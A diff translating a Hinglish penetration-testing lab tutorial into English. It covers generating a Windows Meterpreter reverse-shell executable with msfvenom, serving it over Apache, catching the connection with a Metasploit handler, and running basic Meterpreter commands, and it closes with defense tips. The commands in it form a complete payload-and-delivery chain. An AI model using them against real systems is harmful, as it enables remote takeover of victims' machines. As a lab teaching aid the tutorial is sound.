@@ -1,27 +1,27 @@
 # 🛡️ Practical 1 – Windows Reverse Shell (Metasploit + msfvenom)
 
-Aaj hum ek **basic penetration testing lab practical** samjhenge jisme hum:
-✔ Payload generate karna
-✔ Web server par host karna
-✔ Metasploit handler setup karna
-✔ Remote Meterpreter session establish karna
+Today we will understand a **basic penetration testing lab practical** where we will:
+✔ Generate a payload
+✔ Host it on a web server
+✔ Set up a Metasploit handler
+✔ Establish a remote Meterpreter session
 
-⚠️ Ye practical sirf **authorized lab environment (Kali + Windows VM)** ke liye hai.
+⚠️ This practical is only for an **authorized lab environment (Kali + Windows VM)**.
 
 ---
 
 # 1️⃣ Basic Concept 📌
 
-## 📌 Reverse Shell Kya Hota Hai?
+## 📌 What is a Reverse Shell?
 
-Reverse shell ek aisa connection hota hai jisme:
+A reverse shell is a connection where:
 
-👉 Target machine attacker ko connect karti hai (not vice versa)
+👉 The target machine connects to the attacker (not vice versa)
 
-Matlab:
+Meaning:
 
-* Attacker "wait" karta hai
-* Target "connection initiate" karta hai
+* Attacker "waits"
+* Target "initiates the connection"
 
 ---
 
@@ -46,9 +46,9 @@ Attacker (Kali)  <------  Target (Windows)
 
 ## 🔎 Network Check
 
-Dono machines ka IP same network me hona chahiye.
+Both machines should be on the same network.
 
-Kali IP check:
+Check Kali IP:
 
 ```bash
 ip a
@@ -60,7 +60,7 @@ Example:
 192.168.1.15
 ```
 
-👉 Isko hum **LHOST** bolte hain.
+👉 This is what we call **LHOST**.
 
 ---
 
@@ -68,7 +68,7 @@ Example:
 
 ## 📌 Purpose:
 
-Windows ke liye ek executable file banana jo run hone par reverse connection kare.
+To create an executable file for Windows that initiates a reverse connection when run.
 
 ---
 
@@ -95,8 +95,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=4444 -f exe
 
 ## 📌 Output:
 
-✔ malware.exe generate ho jata hai
-✔ Ye actual payload file hoti hai
+✔ malware.exe is generated
+✔ This is the actual payload file
 
 ---
 
@@ -104,7 +104,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=4444 -f exe
 
 ## 📌 Purpose:
 
-Payload ko host karna taaki target download kar sake.
+To host the payload so the target can download it.
 
 ---
 
@@ -140,7 +140,7 @@ sudo service apache2 status
 http://192.168.1.15/malware.exe
 ```
 
-✔ Agar download ho jaye → hosting successful
+✔ If it downloads successfully → hosting is successful
 
 ---
 
@@ -158,7 +158,7 @@ msfconsole
 
 ## 📌 Purpose:
 
-Incoming reverse connection ko receive karna.
+To receive the incoming reverse connection.
 
 ---
 
@@ -170,7 +170,7 @@ use exploit/multi/handler
 
 ---
 
-## 📌 Payload Set:
+## 📌 Set Payload:
 
 ```bash
 set payload windows/meterpreter/reverse_tcp
@@ -178,7 +178,7 @@ set payload windows/meterpreter/reverse_tcp
 
 ---
 
-## 🌐 Network Config:
+## 🌐 Network Configuration:
 
 ```bash
 set LHOST 192.168.1.15
@@ -187,7 +187,7 @@ set LPORT 4444
 
 ---
 
-# 7️⃣ Listener Start ▶️
+# 7️⃣ Start Listener ▶️
 
 ```bash
 exploit
@@ -203,8 +203,8 @@ run
 
 ## 📌 Status:
 
-✔ Metasploit ab waiting mode me hota hai
-✔ Connection ka wait karta hai
+✔ Metasploit is now in waiting mode
+✔ Waiting for a connection
 
 ---
 
@@ -212,17 +212,17 @@ run
 
 ## 📌 Process:
 
-Windows VM me:
+On the Windows VM:
 
-1. Browser open karo
-2. URL open karo:
+1. Open browser
+2. Open URL:
 
 ```
 http://192.168.1.15/malware.exe
 ```
 
-3. File download karo
-4. Run karo
+3. Download the file
+4. Run it
 
 ---
 
@@ -230,18 +230,18 @@ http://192.168.1.15/malware.exe
 
 Modern Windows:
 
-* Defender block kar sakta hai
-* Unknown exe warning show karega
+* Defender may block it
+* Unknown exe warning will appear
 
-(Lab me usually disable hota hai)
+(Usually disabled in lab environments)
 
 ---
 
 # 9️⃣ Session Establishment 🔗
 
-Agar sab successful hua:
+If everything is successful:
 
-Metasploit me output aayega:
+Metasploit will show output:
 
 ```
 Meterpreter session opened
@@ -249,7 +249,7 @@ Meterpreter session opened
 
 ---
 
-# 🔟 Meterpreter Basic Commands 🧠
+# 🔟 Basic Meterpreter Commands 🧠
 
 ## 📌 System Info:
 
@@ -263,13 +263,13 @@ sysinfo
 getuid
 ```
 
-## 📌 Directory Check:
+## 📌 Check Directory:
 
 ```bash
 pwd
 ```
 
-## 📌 Files List:
+## 📌 List Files:
 
 ```bash
 ls
@@ -280,14 +280,14 @@ ls
 # 📌 Overall Attack Flow Summary 🔥
 
 ```
-1. IP check (LHOST)
-2. Payload create (msfvenom)
-3. Web server setup (Apache)
-4. Payload host
-5. Metasploit handler start
-6. Target download & execute
-7. Reverse connection establish
-8. Meterpreter session open
+1. Check IP (LHOST)
+2. Create payload (msfvenom)
+3. Set up web server (Apache)
+4. Host the payload
+5. Start Metasploit handler
+6. Target downloads and executes
+7. Reverse connection established
+8. Meterpreter session opens
 ```
 
 ---
@@ -305,7 +305,7 @@ ls
 
 ## 📌 Defense Methods:
 
-✔ Don’t run unknown files
+✔ Don't run unknown files
 ✔ Use updated antivirus
 ✔ Disable unnecessary downloads
 ✔ Network monitoring tools
@@ -314,21 +314,21 @@ ls
 
 # 🎯 Interview Key Points
 
-✔ Reverse shell vs bind shell difference
-✔ msfvenom purpose
+✔ Difference between reverse shell and bind shell
+✔ Purpose of msfvenom
 ✔ Meterpreter features
 ✔ Why LHOST is important
-✔ Why same payload must match handler
+✔ Why the payload must match the handler
 
 ---
 
 # 🏁 Final Thought
 
-Ye practical cyber security ka **foundation concept** hai:
+This practical is a **foundation concept** in cyber security:
 
 👉 Payload creation
 👉 Network communication
 👉 Remote session handling
 
-Agar ye samajh aa gaya →
-Next level penetration testing easy ho jata hai 🔥
+If you understand this →
+Next level penetration testing becomes easier 🔥
